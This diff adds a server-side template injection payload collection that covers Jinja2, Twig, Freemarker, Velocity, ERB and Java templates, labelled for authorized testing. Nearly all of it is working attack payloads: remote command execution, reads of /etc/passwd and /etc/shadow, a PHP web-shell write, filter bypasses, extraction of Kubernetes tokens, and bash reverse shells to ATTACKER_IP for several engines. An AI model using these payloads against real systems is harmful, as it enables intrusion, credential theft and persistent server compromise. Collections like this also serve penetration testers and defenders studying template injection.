@@ -1,0 +1,194 @@
+# Server-Side Template Injection (SSTI) Payloads Collection
+# For authorized security testing only
+
+# ============================================
+# DETECTION PAYLOADS
+# ============================================
+
+# Generic detection
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+[[7*7]]
+[% 7*7 %]
+{{7*'7'}}
+{{7*7}}
+#set($x=7*7)${x}
+#set($x=7*7)$x
+[[${7*7}]]
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# ============================================
+# JINJA2 (FLASK/DJANGO)
+# ============================================
+
+# Basic detection
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+
+# Read files
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+
+# RCE via os module
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}
+
+# Reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').read()}}
+
+# Find useful classes
+{{''.__class__.__mro__[2].__subclasses__()}}
+{% for c in [].__class__.__base__.__subclasses__() %}
+  {% if c.__name__=='catch_warnings' %}
+    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
+  {% endif %}
+{% endfor %}
+
+# Command execution via subprocess
+{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+
+# Usinglipsum
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+
+# Using cycler/joiner/namespace
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+
+# File write
+{{config.__class__.__init__.__globals__['os'].popen('echo "<?php system($_GET[cmd]);?>" > /var/www/html/shell.php').read()}}
+
+# Bypass filter
+{{config.__class__.__init__.__globals__['__import__']('o'+'s').popen('id').read()}}
+{{()|attr('__class__')|attr('__mro__')|(attr('__getitem__'))(2)|attr('__subclasses__')()}}
+{{().__class__.__bases__[0].__subclasses__()[213]('id',shell=True,stdout=-1).communicate()}}
+
+# ============================================
+# TWIG (SYMFONY)
+# ============================================
+
+# Basic detection
+{{7*7}}
+{{7*'7'}}
+
+# RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+
+# File read
+{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("/etc/passwd")}}
+
+# Reverse shell
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1")}}
+
+# Using include
+{{_self.env.setCacheLoader('file:///etc/passwd')}}
+
+# ============================================
+# FREEMARKER
+# ============================================
+
+# Basic detection
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# RCE
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls -la")}
+
+# Reverse shell
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1")}
+
+# File read
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/shadow")}
+
+# Object constructor
+${objectConstructor("java.lang.Runtime").getRuntime().exec("id")}
+
+# ============================================
+# VELOCITY (TCL/PHP)
+# ============================================
+
+# Basic detection
+#set($x=7*7)${x}
+#set($str=$class.inspect("java.lang.String"))
+#set($chr=$class.inspect("java.lang.Character"))
+
+# RCE
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))
+$x.waitFor()
+#set($out=$x.getInputStream())
+#foreach($i in [1..$out.available()])
+$chr.toChars($out.read())
+#end
+
+# File read
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("cat /etc/passwd"))
+$x.waitFor()
+#set($out=$x.getInputStream())
+#foreach($i in [1..$out.available()])
+$chr.toChars($out.read())
+#end
+
+# Reverse shell
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"))
+$x.waitFor()
+
+# ============================================
+# RUBY (ERB)
+# ============================================
+
+# Basic detection
+<%= 7*7 %>
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen("id").readlines() %>
+
+# File read
+<%= File.open('/etc/passwd').read %>
+<%= IO.read('/etc/passwd') %>
+
+# RCE
+<%= system("cat /etc/passwd") %>
+<%= `cat /etc/passwd` %>
+<%= IO.popen("cat /etc/passwd").readlines() %>
+
+# Reverse shell
+<%= system("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1") %>
+
+# ============================================
+# JAVA TEMPLATES
+# ============================================
+
+# Detection
+${7*7}
+#{7*7}
+
+# Object manipulation
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getProperty('user.dir')}
+
+# ============================================
+# DOCKER/KUBERNETES SSTI
+# ============================================
+
+# Environment variables
+{{config}}
+{{request.environ}}
+{{request.args}}
+{{request.form}}
+{{request.cookies}}
+
+# Kubernetes secrets
+{{config.K8S_SERVICE_ACCOUNT_TOKEN}}
+{{config.K8S_NAMESPACE}}
